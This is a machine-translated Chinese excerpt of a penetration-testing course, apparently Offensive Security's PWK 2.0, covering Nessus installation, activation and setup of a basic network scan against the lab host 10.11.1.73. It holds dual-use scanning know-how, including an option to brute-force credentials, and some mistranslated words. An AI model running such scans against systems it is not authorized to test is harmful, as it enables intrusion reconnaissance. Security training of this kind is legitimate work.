<div style="position:absolute;top:249507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">229 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Renai LeMay，2005），https://www.cnet.com/news/nessus-security-tool-closes-its-source/</font></font></font></nobr></div>
<div style="position:absolute;top:249527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">230 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（绿骨网络，2019 年），http://www.openvas.org</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:249655;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="211"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 211 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:249688;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:250765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:250765;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:250765;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">211</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:250078;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 44：Nessus 下载和校验和</font></font></i></nobr></div>
<div style="position:absolute;top:250110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/nessus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sha256sum Nessus-XXXdeb</font></font></font></b></nobr></div>
<div style="position:absolute;top:250128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">34199e8ff70bc1502b82495272cee2d313dc15eacd1c0c1da6b851a32892d39d Nessus-XXXdeb</font></font></nobr></div>
<div style="position:absolute;top:250147;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 275 - 验证校验和</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:250176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行sha256sum后显示的值和网站上显示的值应该</font></font></nobr></div>
<div style="position:absolute;top:250196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比赛。</font><font style="vertical-align: inherit;">请注意，此校验和取决于版本，并且可能与</font></font></nobr></div>
<div style="position:absolute;top:250215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以上数字。</font></font></nobr></div>
<div style="position:absolute;top:250248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们的校验和匹配，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装包</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:250283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/nessus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install ./Nessus-XXXdeb</font></font></font></b></nobr></div>
<div style="position:absolute;top:250300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:250317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">准备解压 .../kali/nessus/Nessus-XXXdeb ...</font></font></nobr></div>
<div style="position:absolute;top:250334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拆包 nessus (XXX) ...</font></font></nobr></div>
<div style="position:absolute;top:250351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在设置 nessus (XXX) ...</font></font></nobr></div>
<div style="position:absolute;top:250368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拆开 Nessus 扫描仪核心组件的包装...</font></font></nobr></div>
<div style="position:absolute;top:250402;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以通过键入 /etc/init.d/nessusd start 来启动 Nessus Scanner</font></font></font></b></nobr></div>
<div style="position:absolute;top:250419;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后去 https://kali:8834/ 配置你的扫描仪</font></font></font></b></nobr></div>
<div style="position:absolute;top:250452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理 systemd (241-3) 的触发器...</font></font></nobr></div>
<div style="position:absolute;top:250472;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 276 - Nessus 安装</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:250502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装包后，我们可以启动</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nessusd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:250536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/nessus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo /etc/init.d/nessusd start</font></font></font></b></nobr></div>
<div style="position:absolute;top:250553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 Nessus : .</font></font></nobr></div>
<div style="position:absolute;top:250572;left:377"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 277 - 启动 Nessus</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:250602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦 Nessus 运行，我们可以启动浏览器并导航到 https://localhost:8834。</font><font style="vertical-align: inherit;">我们将</font></font></nobr></div>
<div style="position:absolute;top:250621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出现一个证书错误，指示未知的证书颁发者，但这是意料之中的</font></font></nobr></div>
<div style="position:absolute;top:250641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于使用了自签名证书。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:250843;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="212"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 212 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:250876;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:251953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:251953;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:251953;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">212</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:251237;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 45：Nessus 显示证书错误</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:251268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要接受自签名证书，请单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高级</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加例外...</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:251737;left:298"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 46：为无效证书添加例外</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:251768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开安全异常弹出窗口，我们可以点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确认安全异常</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来接受</font></font></nobr></div>
<div style="position:absolute;top:251788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:252031;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="213"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 213 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:252064;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:253141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:253141;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:253141;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">213</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:252509;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 47：确认安全异常</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:252540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页面加载后，系统会提示我们选择 Nessus 产品。</font><font style="vertical-align: inherit;">为了我们的目的，我们要</font></font></nobr></div>
<div style="position:absolute;top:252559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部署</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nessus Essentials</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这是通过</font><font style="vertical-align: inherit;">从列表中</font><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nessus Essentials</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并单击</font></font></nobr></div>
<div style="position:absolute;top:252579;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:252973;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 48：选择 Nessus Essentials</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:253004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，系统会提示我们请求 Nessus Essentials 的激活码。</font><font style="vertical-align: inherit;">填写表格</font></font></nobr></div>
<div style="position:absolute;top:253023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供所需信息，然后单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电子邮件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会将激活码发送到我们的电子邮件</font></font></nobr></div>
<div style="position:absolute;top:253043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:253219;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="214"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 214 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:253252;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:254329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:254329;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:254329;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">214</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:253733;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 49：请求激活码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:253764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收到电子邮件发送的激活码后，我们可以将其输入 Nessus 并单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:254118;left:378"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 50：激活 Nessus</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:254149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在 Nessus 被激活，我们将被提示创建一个本地 Nessus 用户帐户： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:254407;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="215"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 215 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:254440;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:255517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:255517;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:255517;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">215</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:254888;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 51：创建本地 Nessus 帐户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:254919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们必须下载并编译所有插件。</font><font style="vertical-align: inherit;">这可能需要大量时间</font></font></nobr></div>
<div style="position:absolute;top:254939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">去完成。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:255256;left:380"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 52：更新 Nessus</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:255287;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.2 定义目标</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:255325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦 Nessus 安装完毕，就该设置我们的第一次扫描了。</font><font style="vertical-align: inherit;">首先，我们只需单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新扫描”</font></font></i></nobr></div>
<div style="position:absolute;top:255345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:255595;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="216"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 216 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:255628;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:256705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:256705;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:256705;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">216</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:256009;left:384"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 53：创建扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:256040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nessus 支持多种扫描类型，包括：</font></font></nobr></div>
<div style="position:absolute;top:256072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:256072;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本网络扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有适合用于的各种检查的通用扫描</font></font></nobr></div>
<div style="position:absolute;top:256092;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种目标类型。</font></font></nobr></div>
<div style="position:absolute;top:256120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:256120;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据补丁审核</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：经过身份验证的扫描，可枚举丢失的补丁。</font></font></nobr></div>
<div style="position:absolute;top:256148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:256148;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序测试</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：用于发现 Web 中已发布漏洞的专门扫描</font></font></nobr></div>
<div style="position:absolute;top:256168;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序。</font></font></nobr></div>
<div style="position:absolute;top:256196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:256196;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Spectre 和 Meltdown</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：针对 Spectre </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">231</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 Meltdown </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">232</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞的</font><font style="vertical-align: inherit;">针对性扫描</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:256229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们建议研究这些扫描类型，但在本介绍部分，我们将重点关注</font></font></nobr></div>
<div style="position:absolute;top:256248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准的基本网络扫描，我们可以通过单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本网络扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来启动</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:256635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">231 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2020 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Spectre_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(security_vulnerability)</font></font></font></nobr></div>
<div style="position:absolute;top:256655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">232 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Meltdown_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(security_vulnerability)</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:256783;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="217"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 217 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:256816;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:257893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:257893;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:257893;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">217</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:257264;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 54：选择基本网络扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:257295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将显示带有两个必需参数的扫描配置设置屏幕：</font></font></nobr></div>
<div style="position:absolute;top:257314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的扫描和目标列表。</font><font style="vertical-align: inherit;">Nessus 支持将目标添加为 IP 地址、IP 范围或</font></font></nobr></div>
<div style="position:absolute;top:257334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">逗号分隔的 FQDN 或 IP 列表。</font></font></nobr></div>
<div style="position:absolute;top:257366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本例中，我们将扫描</font><font style="vertical-align: inherit;">PWK 实验室中</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Gamma</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器，其 IP 地址为</font></font></nobr></div>
<div style="position:absolute;top:257386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.73。</font><font style="vertical-align: inherit;">我们将在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Name</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段中</font><font style="vertical-align: inherit;">输入“Gamma - Basic” </font><font style="vertical-align: inherit;">，在</font><i><font style="vertical-align: inherit;">Targets 中</font></i><font style="vertical-align: inherit;">输入 IP 地址</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:257405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">场地： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:257971;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="218"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 218 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:258004;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:259081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:259081;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:259081;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">218</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:258605;left:348"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 55：配置 Gamma 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:258636;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.3 配置扫描定义</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:258674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们选择了基本网络扫描模板定义，与所有其他</font></font></nobr></div>
<div style="position:absolute;top:258693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模板，预配置了默认设置。</font><font style="vertical-align: inherit;">但是，这些默认值可能不是</font></font></nobr></div>
<div style="position:absolute;top:258713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正是我们正在寻找的，我们必须考虑我们的环境，我们的时间</font></font></nobr></div>
<div style="position:absolute;top:258732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">约束，以及将被扫描的目标。</font><font style="vertical-align: inherit;">配置时需要考虑的一些事项</font></font></nobr></div>
<div style="position:absolute;top:258752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本网络扫描模板包括：</font></font></nobr></div>
<div style="position:absolute;top:258785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 我们的目标是位于内部网络还是可以公开访问？</font></font></nobr></div>
<div style="position:absolute;top:258813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 扫描器是否应该尝试暴力破解用户凭据？</font></font></nobr></div>
<div style="position:absolute;top:258841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 扫描器应该扫描所有 TCP 和 UDP 端口还是只扫描公共端口？</font></font></nobr></div>
<div style="position:absolute;top:258869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 扫描仪应该运行哪些检查，应该避免哪些检查？</font></font></nobr></div>
<div style="position:absolute;top:258898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 扫描仪应该运行经过身份验证的扫描还是未经身份验证的扫描？</font></font></nobr></div>
<div style="position:absolute;top:258930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于此扫描，我们希望对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口</font><font style="vertical-align: inherit;">运行初始基本端口扫描</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">默认情况下，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本</font></font></i></nobr></div>
